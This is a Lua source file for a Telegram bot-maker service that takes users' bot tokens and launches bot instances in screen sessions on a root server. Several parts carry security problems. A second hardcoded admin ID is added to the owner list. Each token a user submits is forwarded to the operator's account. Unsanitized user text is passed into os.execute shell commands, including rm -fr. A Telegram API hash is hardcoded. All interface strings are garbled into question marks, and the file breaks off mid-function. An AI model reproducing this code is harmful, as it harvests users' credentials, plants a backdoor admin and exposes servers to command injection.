SshId = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
redis = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
-------------------------------------------------------------------
luatele = require('luatele')
-------------------------------------------------------------------
local infofile = io.open("./sudo.lua","r")
if not infofile then
if not redis:get(SshId.."token") then
os.execute('sudo rm -rf luatele.zip')
os.execute('sudo rm -rf tdlua.so')
os.execute('sudo rm -rf luatele.lua')
io.write('\27[1;31mSend your Bot Token Now\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request("https://api.telegram.org/bot"..TokenBot.."/getMe")
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mBot Token is Wrong\n')
else
io.write('\27[1;34mThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
redis:setex(SshId.."token",300,TokenBot)
end 
else
print('\27[1;34mToken not saved, try again')
end 
os.execute('lua5.3 start.lua')
end
if not redis:get(SshId.."id") then
io.write('\27[1;31mSend Developer ID\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('%d+') then
io.write('\n\27[1;34mDeveloper ID saved \n\n\27[0;39;49m')
redis:setex(SshId.."id",300,UserId)
else
print('\n\27[1;34mDeveloper ID not saved\n')
end 
os.execute('lua5.3 start.lua')
end
local url , res = https.request('https://api.telegram.org/bot'..redis:get(SshId.."token")..'/getMe')
local Json_Info = JSON.decode(url)
local Inform = io.open("sudo.lua", 'w')
Inform:write([[
return {
	
Token = "]]..redis:get(SshId.."token")..[[",

id = ]]..redis:get(SshId.."id")..[[

}
]])
Inform:close()
local start = io.open("start", 'w')
start:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])
start:close()
local Run = io.open("Run", 'w')
Run:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..Json_Info.result.username..[[ -X kill
screen -S ]]..Json_Info.result.username..[[ ./start
done
]])
Run:close()
redis:del(SshId.."id")
redis:del(SshId.."token")
os.execute('cd && cd '..Json_Info.result.username..';chmod +x start;chmod +x Run;./Run')
end
Information = dofile('./sudo.lua')
sudoid = Information.id
Token = Information.Token
bot_id = Token:match("(%d+)")
os.execute('sudo rm -fr .CallBack-Bot/'..bot_id)
LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=bot_id,token=Token}
Sudos = {sudoid,1558668590}
Sudo_Id = Sudos
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender.user_id) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Developer(user)  
local idSub = false  
for k,v in pairs(Sudos) do  
if tonumber(user) == tonumber(v) then  
idSub = true    
end
end  
return idSub
end
function getChatId(id) local chat = {} local id = tostring(id) if id:match('^-100') then local channel_id = id:gsub('-100', '') chat = {ID = channel_id, type = 'channel'} else local group_id = id:gsub('-', '') chat = {ID = group_id, type = 'group'} end return chat end
function scandirfile(directory) local i, t, popen = 0, {}, io.popen for filename in popen('ls '..directory..''):lines() do i = i + 1 t[i] = filename end return t end
function exi_filesx(cpath) local files = {} local pth = cpath for k, v in pairs(scandirfile(pth)) do table.insert(files, v) end return files end
function file_exia(name, cpath) for k,v in pairs(exi_filesx(cpath)) do if name == v then return true end end return false end
reply_markup = LuaTele.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text = '?????? ?????? ???',type = 'text'},{text ='?????? ?????? ???',type = 'text'}},
{{text ='?????????? ?????? ???',type = 'text'},{text ='?????????? ?????? ???',type = 'text'}},
{{text ='?????? ?????????? ???',type = 'text'},{text ='?????????????????? ???',type = 'text'}},
{{text = '?????????? ?????????? ?????????????? ???',type = 'text'},{text ='?????????? ?????????? ?????????????? ???',type = 'text'}},
{{text = '?????????????? ?????????????? ???',type = 'text'},{text ='?????????????????? ???', type = 'text'},{text ='???????????????????? ???', type = 'text'}},
{{text = '?????????? ?????????????????? ???',type = 'text'}},
{{text = '?????????? ???',type = 'text'},{text = '???????????????? ???',type = 'text'}},
{{text = '?????????? ???????????? ???',type = 'text'},{text = "?????????? ?????????????????????", type = 'text'}},
{{text = '?????????? ???',type = 'text'}},
}
}
reply_markun = LuaTele.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text ='?????? ?????????? ???',type = 'text'},{text = '?????? ?????? ???',type = 'text'}},
{{text = '?????????? ???????????? ???',type = 'text'}},
}
}
reply_markuk = LuaTele.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text ='?????????? ???',type = 'text'},{text = '?????????? ???',type = 'text'}},
}
}
reply_markui = LuaTele.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text = '?????????? ???',type = 'text'}},
}
}
function Run(msg,data)
if msg.content.text then
text = msg.content.text.text
if not redis:sismember(bot_id..":user_id",msg.sender.user_id) then
redis:sadd(bot_id..":user_id",msg.sender.user_id)
end
else 
text = nil
end
if LuaTele.getChatId(msg.chat_id).type == "basicgroup" then 
if Developer(msg.sender.user_id)  then
if text == '?????????? ???' then 
if redis:get(bot_id..":Send:"..msg.sender.user_id) then
redis:del(bot_id..":Send:"..msg.sender.user_id)
u = "*?????? ???? ?????????? ?????????????? ??????????*"
elseif redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
redis:del(bot_id..":set:"..msg.chat_id..":addCh")
u = "*?????? ???? ?????????? ?????????? ???????????????? ????????????????*"
elseif redis:get(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) 
u = '*?????? ???? ?????????? ?????????? ??????????.*'
elseif redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id)
u = '*?????? ???? ?????????? ?????????? ??????????.*'
elseif redis:get(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) 
u = '*?????? ???? ?????????? ?????????? ??????????.*'
elseif redis:get(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) 
u = '*?????? ???? ?????????? ?????????? ??????????.*'
elseif redis:get(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
u = '*?????? ???? ?????????? ?????????? ??????????.*'
else
u = '*??????????? ???? ???? ???????? ?????????? ?????????????? ???????? ??\n\n????????????? ???????? ???? ???????? ??* [--](t.me/EinoTeam) \n\n*????????????? ???????? ?????? ?????? ???????? ?????? ???? ???????? ??????????????\n\n     ???????? ?????????????? ?????????? ???????????? ???????? ???????? ??????????????????\n??? ??? ??? ??? ??? ??? ??? ??? ??? ???*\n[--](--)'
end
LuaTele.sendText(msg.chat_id,msg.id,""..u.."", 'md', true , false, false, false, reply_markup)
return false
end
if redis:get(bot_id..":Send:"..msg.sender.user_id) then
lis = redis:smembers(bot_id..":user_id") 
if msg.forward_info or text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then 
redis:del(bot_id..":Send:"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ?????? ?????????? ?????????????? ?????? ( "..#lis.." ?????? ) *","md",true)
for k,v in pairs(lis) do  
local FedMsg = LuaTele.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ?????? ?????????????? ?????????? ???? ( "..redis:get(bot_id..":count:true").." ) ?????? *","md",true)
redis:del(bot_id..":count:true") 
end
end
if text == '?????????? ???' then 
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????? ???? ?????????????? ???????? :*", 'md', false, false, false, false, LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = '?????????? ???',type = 'text'}},}})
redis:setex(bot_id..":Send:"..msg.sender.user_id,600,true)  
return false
end
if redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
if msg.forward_info then
redis:del(bot_id..":set:"..msg.chat_id..":addCh") 
if msg.forward_info.origin.chat_id then          
id_chat = msg.forward_info.origin.chat_id
else
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????? ?????? ???????? ???????? ?????????? ???? ???????? ?????? .*","md")
return false  
end     
sm = LuaTele.getChatMember(id_chat,bot_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
redis:set(bot_id..":TheCh",id_chat) 
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???? ?????? ???????????? ?????????? *","md", true)
else
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ?????????? ?????? ???????? ??????????????. *","md", true)
end
end
end
if text == '???????????????? ???' then 
if not redis:get(bot_id..":TheCh") then
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???? ???????? ???????????? ?????????? ???? ???????????? ???????? *","md", false, false, false, false, LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = '?????????? ???',type = 'text'}},}})  
elseif redis:get(bot_id..":TheCh") then
infokl = LuaTele.getChatMember(redis:get(bot_id..":TheCh"),bot_id)
if infokl and infokl.status and infokl.status.luatele == "chatMemberStatusAdministrator" then
Get_Chat = LuaTele.getChat(redis:get(bot_id..":TheCh"))
Info_Chats = LuaTele.getSupergroupFullInfo(redis:get(bot_id..":TheCh"))
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link and  Get_Chat and Get_Chat.title then 
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????????????? ???????????????? ???????? ?????? ???????? :\n"..Info_Chats.invite_link.invite_link.."\n?????? ?????????? ?????????????? ???? ???????? ?????????? ?????????? ???? ???????? ???????? .\n?????? ?????????? ?????????? ?????????????? ???? ???????? ?????????? ???????? .*","md", false, false, false, false, LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = '?????????? ???',type = 'text'}},}})  
else
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????? ???? ?????????? ???? ???????????? ???????? :*","md", false, false, false, false, LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = '?????????? ???',type = 'text'}},}})  
end
else
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????? ???? ?????????? ???? ???????????? ???????? :*","md", false, false, false, false, LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = '?????????? ???',type = 'text'}},}})  
end
end
end
if text == '???????????????????? ???' then 
cubot = 0
for jj in io.popen('ls /root'):lines() do
if jj then 
if jj ~= LuaTele.getMe().username then 
if jj and jj:match('(%S+)[Bb][Oo][Tt]') then
cubot = cubot +1
end
end
end
end 
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????????????????? :*\n\n?????? ?????? ?????????????????? : { *"..(redis:scard(bot_id..":user_id") or 1).."* } ?????????? .".."\n?????? ?????? ?????????????????? : ( *"..cubot.."* ) ?????????? .", 'md')
return false
end
if text == '?????????? ?????????? ?????????????? ???' then
if redis:get(bot_id..":freebot") then
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ?????????? .*', 'md', false, false, false, false, reply_markup)
else
redis:set(bot_id..":freebot",true)
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????????? ?????????? ?????????????? ?????????? .*', 'md', false, false, false, false, reply_markup)
end
end
if text == '?????????? ?????????? ?????????????? ???' then
if redis:get(bot_id..":freebot") then
redis:del(bot_id..":freebot")
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????????? ?????????? ?????????????? .*', 'md', false, false, false, false, reply_markup)
else
return LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????? ???????????? .*', 'md', false, false, false, false, reply_markup)
end
end
if text == '?????????????????? ???' then
i = 0
local t = '???????????????????????? ???????????????? ?????????? \n  - - - - - - - - -\n'
for v in io.popen('ls /var/run/screen/S-root'):lines() do
i = i + 1
t = t..i..'- { `'..v..'` }\n'
end
LuaTele.sendText(msg.chat_id,msg.id,t,"md")
return false
end
if text == '?????? ?????????? ???' then
redis:set(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id,'true') 
LuaTele.sendText(msg.chat_id,msg.id,'?????????????? ?????????????? ????????')
return false
end
if redis:get(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text == '?????????? ???' then
LuaTele.sendText(msg.chat_id,msg.id, '?????????? ?????????? ??????????') 
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
return false  
end 
if text and text:match("^(%d+)(.)(.*)") then
if text:find('install') then
LuaTele.sendText(msg.chat_id,msg.id, '?????????????? ???????? ?????????? ???????? ??????????????\n?????????????? ?????? ?????????????? ?????? ???????? ???? ???????? ???? ???????????????? ??????????') 
return false 
end 
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id, '?????????? ?????? ?????????????? ???????????? ??????????')
os.execute('screen -S '..text..' -X kill')
os.execute('screen -X -S '..text..' quit')
return false  
end 
end 
if text ==  '?????????? ?????????????????? ???' then
i = 0
t = '?????????? ?????????? ???????????? : \n ??? ??? ??? ??? ???\n'
for v in io.popen('ls /root'):lines() do
if v ~= '['..LuaTele.getMe().username..']' then
if v and v:match('(%S+)[Bb][Oo][Tt]') then
fi = io.open("/root/"..v.."/sudo.lua"):read('*a')
TokenInfo = fi:match('Token = "(.*)"')
Token = TokenInfo:match("(%d+)")
local url , res = https.request('https://api.telegram.org/bot'..TokenInfo..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
local keys = redis:keys(Token..'*')
for i = 1, #keys do 
redis:del(keys[i])
end
t = t.."@"..v.."\n"
os.execute('cd && rm -fr '..v..' && screen -d -m -S del screen -S '..v..' -X kill')
end
local keys = redis:keys(Token..'*')
b = 0
for i = 1, #keys do 
b = b + 1
end
if b <= 10 then
for i = 1, #keys do 
redis:del(keys[i])
end
t = t.."@"..v.."\n"
os.execute('cd && rm -fr '..v..' && screen -d -m -S del screen -S '..v..' -X kill')
end
end
end
end 
LuaTele.sendText(msg.chat_id,msg.id,t, 'md')
return false
end
if text == "?????????? ?????????????????? ???" then
i = 0
t = '*?????? ???? ?????????? ???????? ?????????? ?????????????? .\n\n?????? ???????? ?????????? ?????? ???????????????? ???????? ?????????? .*'
for v in io.popen('ls /root'):lines() do
if v then 
if v ~= LuaTele.getMe().username then 
if v and v:match('(%S+)[Bb][Oo][Tt]') then
os.execute('cd ../'..v..' && rm -rf Snaybir.lua')
os.execute('cp -a ./Files/Snaybir.lua  ../'..v)
i = i +1
end
end
end
end 
if i == 0 then 
t = '*?????? ???? ???????? ?????????? ????????????.*'
end
LuaTele.sendText(msg.chat_id,msg.id,t,"md",true)  
return false
end
if text == '?????????? ???????????? ???' then    
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????????? ?????????? ???????????? ??????????*',"md",true)  
dofile("start.lua") 
return false
end 
if text == "/start" then 
local bl = '*?????? ???????? ???? ???? ?????????? ???????????? ??????????????*' 
return LuaTele.sendText(msg.chat_id,msg.id,bl, 'md', false, false, false, false, reply_markup)
end
if redis:get(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) == 'true1' then
local UserName = string.match(text, "@[%a%d_]+") 
if UserName then
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????????? ?????? ?????????? ???????? ???????? ?????? .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????????? ?????????? ???? ???????????? ???????? ??????*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???????? ?????? ???? ???????????? ???????? ?????????? ???????? ?????? .*","md",true)  
return false
end
redis:del(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) 
local url , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..'/getMe')
local Jsonfo = JSON.decode(url)
Sudo  = UserId_Info.id
file = io.open("./Files/sudo.lua", "w")  
file:write([[
return {
	
Token = "]]..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..[[",

id = ]]..Sudo..[[

}
]])
file:close() 
file = io.open("./Files/start", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 Snaybir.lua
done
]])  
u , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..'/getMe')
JsonSInfo = JSON.decode(u)
UserBot = string.upper(JsonSInfo['result']['username']:gsub('@',''))
file:close()  
file = io.open("./Files/Run", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..UserBot..[[ -X kill
screen -S ]]..UserBot..[[ ./start
done
]])  
file:close() 
os.execute('cp -a ./Files/. ../'..UserBot..' && cd && cd '..UserBot..';screen -d -m -S '..UserBot..' lua5.3 Snaybir.lua')
redis:del(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id,'?????? ???? ?????? ?????????????? ???????????? ?????? ?????????? ?????????? ??????????..', 'md')
return false  
end
end
if redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text and text:match("^(%d+)(:)(.*)") then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????????? ?????? ???????? ???????? ????????*', 'md')
return false
else
NameBot = Json_Info.result.first_name
UserNameBot = Json_Info.result.username
NameBot = NameBot:gsub('"','') 
NameBot = NameBot:gsub("'",'') 
NameBot = NameBot:gsub('`','') 
NameBot = NameBot:gsub('*','') 
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) 
redis:set(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id,'true1') 
redis:set(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id,text) 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????? ???????? ?????????? ?????????? .\n\n???????????????????? ?????????? ?????????????? : \n\n??? ?????? ?????????? ???* ['..NameBot..'](t.me/'..UserNameBot..')\n*??? ???????? ?????????? ???* [@'..UserNameBot..']\n\n*?????? ???????? ???? ???????? ???????????? ..*', 'md', true)
return false
end
end
end
if text == '?????? ?????? ???' then
redis:set(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id,'true') 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ???????? ?????????? ???????? :*',"md",true)  
return false
end
if redis:get(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
user_b = string.upper(text:gsub('@',''))
if file_exia(user_b,'/root') then
if user_b == string.upper(LuaTele.getMe().username) then 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ?????? ???? ???????? ?????????? ???????? ??????*', 'md')
return false 
end 
if text and text:match('(%S+)[Bb][Oo][Tt]') then 
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id)
os.execute('screen -S '..user_b..' -X kill')
os.execute('cd && rm -fr '..user_b)
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????? ???????????? ?????????? ??????????*', 'md')
end
else
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????? ???? ?????? ???????????? ?????? ?????????? ???? ???? ????????*', 'md')
end
end
if text == '?????? ?????? ???' then
redis:set(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id,'true') 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ???????? ?????????? ????????*', 'md')
return false
end
if text == '?????????????????? ???' then
local i = 0
local t = '?????? ?????????? ?????????????????? \n ??? ??? ??? ??? ???\n'
for v in io.popen('ls /root'):lines() do
if v then 
if v ~= LuaTele.getMe().username then 
if v and v:match('(%S+)[Bb][Oo][Tt]') then 
i = i +1
t = t..'*'..i..'- * [@'..v..'] \n' 
end
end 
end
end 
if i == 0 then 
t = '*?????? ???? ???????? ??????????????.*'
end
LuaTele.sendText(msg.chat_id,msg.id,t, 'md')
return false
end
if text == '?????????????? ?????????????? ???' then
LuaTele.sendText(msg.chat_id,msg.id,io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '?????????????? ?????????????? ??? ???\n`'"$LinuxVersion"'`' 
echo '??? ??? ??? ??? ??? ??? ??? ??? ???\n???????????????????? ?????????????????? ??? ???\n`'"$MemoryUsage"'`'
echo '??? ??? ??? ??? ??? ??? ??? ??? ???\n?????????????? ?????????????? ??? ???\n`'"$HardDisk"'`'
echo '??? ??? ??? ??? ??? ??? ??? ??? ???\n???????????????????? ??? ???\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '??? ??? ??? ??? ??? ??? ??? ??? ???\n?????????????????? ??? ???\n`'`whoami`'`'
echo '??? ??? ??? ??? ??? ??? ??? ??? ???\n???????????? ?????????? ?????????????? ??? ???\n`'"$UpTime"'`'
]]):read('*a'),'md')
end
if text == '?????????? ?????? ???' then
redis:set(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id,'true') 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ???????? ?????????? ???????? ???????? @*', 'md')
return false
end
if redis:get(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text and text:match('(%S+)[Bb][Oo][Tt]') then
user_b = string.upper(text:gsub('@',''))
if user_b == string.upper(LuaTele.getMe().username) then 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ?????? ???? ???????? ?????????? ???????? ??????*', 'md', false, false, false, false, reply_markup)
return false 
end
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
os.execute('screen -S '..user_b..' -X kill')
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????????? ?????????? ?????????? ??????????*', 'md')
return false  
end 
end 
if text == '?????????? ?????? ???' then
redis:set(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id,'true') 
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????????? ???????? ?????????? ???????? @ ????????*', 'md')
return false
end
if redis:get(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
user_b = string.upper(text:gsub('@',''))
if file_exia(text,'/root') then
if user_b ~= LuaTele.getMe().username then 
if text and text:match('(%S+)[Bb][Oo][Tt]') then 
redis:del(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) 
os.execute('cd && cd '..user_b..';screen -d -m -S '..user_b..' lua5.3 Snaybir.lua')
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ?????????? ?????????? ??????????*', 'md')
return false  
else
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????????? ?????? ???????? ??????*', 'md')
end 
else
LuaTele.sendText(msg.chat_id,msg.id,'*?????????? ?????????? ?????? ???? ???????????? ??????????????*', 'md')
end 
else
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???? ???????? ?????? ?????????? ???????? ????????????*', 'md')
end 
end 
end --- end Devloper
if not Developer(msg.sender.user_id)  then
if msg and redis:get(bot_id..":TheCh") then
local Channel = redis:get(bot_id..":TheCh")
if Channel then
if LuaTele.getChatMember(Channel,bot_id) and LuaTele.getChatMember(Channel,bot_id).status and LuaTele.getChatMember(Channel,bot_id).status.luatele == "chatMemberStatusAdministrator" then
Get_Chat = LuaTele.getChat(Channel)
Info_Chats = LuaTele.getSupergroupFullInfo(Channel)
if Get_Chat and Get_Chat.title then
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link then
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchatmember?chat_id='..Channel..'&user_id='..msg.sender.user_id)
local ChannelJoin = JSON.decode(url)
if ChannelJoin.result.status == "left" then
local reply_inline = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},}}
return LuaTele.sendText(msg.chat_id,msg.id,"*\n?????? ???????? ?????????? .\n?????? ???????? ???????????????? ?????????? ?????????? ???????????? ???? ????????????????\n\n- "..Info_Chats.invite_link.invite_link.."\n\n??????| ?????????? ???? ???????? /start*", 'md',true, false, false, false, reply_inline)
end
end
end
end
end
end
if text == "/start" then 
local bl = '*??????????? ???? ???? ???????? ?????????? ?????????????? ???????? ??\n\n????????????? ???????? ???? ???????? ??* [--](--) \n\n*????????????? ???????? ?????? ?????? ???????? ?????? ???? ???????? ??????????????\n\n     ???????? ?????????????? ?????????? ???????????? ???????? ???????? ??????????????????\n??? ??? ??? ??? ??? ??? ??? ??? ??? ???*\n[--](--)'
return LuaTele.sendText(msg.chat_id,msg.id,bl, 'md', true , false, false, false, reply_markun)
end
if text == '?????????? ???????????? ???' then 
return LuaTele.sendText(msg.chat_id,msg.id,[[*
--
]], 'md', false, false, false, false, reply_markun)
end
if redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text == '?????????? ???' then
local bl = '*?????? ???? ?????????? ?????????? ??????????*'
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,bl, 'md', false, false, false, false, reply_markun)
return false
end
if text and text:match("^(%d+)(:)(.*)") then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
LuaTele.sendText(msg.chat_id,msg.id,'*?????? ???????????? ?????? ???????? ???????? ????????*', 'md')
return false
else
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Jsonfo = JSON.decode(url)
Sudo  = msg.sender.user_id
file = io.open("./Files/sudo.lua", "w")  
file:write([[
return {
	
Token = "]]..text..[[",

id = ]]..Sudo..[[

}
]])
file:close() 
file = io.open("./Files/start", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 Snaybir.lua
done
]])  
local infouser = LuaTele.getUser(msg.sender.user_id)
redis:set(bot_id..':Set:UserName'..msg.sender.user_id,infouser.username)
redis:set(bot_id..':Set:TokenUser'..msg.sender.user_id,text)
u , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
JsonSInfo = JSON.decode(u)
UserBot = string.upper(JsonSInfo['result']['username'])
file:close()  
file = io.open("./Files/Run", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..UserBot..[[ -X kill
screen -S ]]..UserBot..[[ ./start
done
]])  
file:close() 
os.execute('cp -a ./Files/. ../'..UserBot..' && cd && cd '..UserBot..';screen -d -m -S '..UserBot..' lua5.3 Snaybir.lua')
UserNameBot = Json_Info.result.username
NameBot = Json_Info.result.first_name
NameBot = NameBot:gsub('"','') 
NameBot = NameBot:gsub("'",'') 
NameBot = NameBot:gsub('`','') 
NameBot = NameBot:gsub('*','') 
redis:set(bot_id..":Bot:"..msg.sender.user_id,UserBot)
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) 
local tokenbot = redis:get(bot_id..':Set:TokenUser'..msg.sender.user_id)
local userdev = redis:get(bot_id..':Set:UserName'..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,"*?????? ???? ?????? ?????????? ?????????? ???? ?????????? .*\n\n- ?????? ?????????? ??? ["..NameBot.."](t.me/"..UserNameBot..")\n\n- ???????? ?????????? ??? @["..UserNameBot.."]", 'md', true) 
LuaTele.sendText(sudoid,0,'\n???????????????? ???????? \n\n???????????????????? ?????????? :\n?????????????? ???????????? : [@'..userdev..']\n?????????????????? : `'..tokenbot..'`\n?????????????? ?????????? : [@'..UserNameBot..']', 'md', true) 
return false
end
end
end
if text == '?????? ?????? ???' then
if redis:get(bot_id..":freebot") then
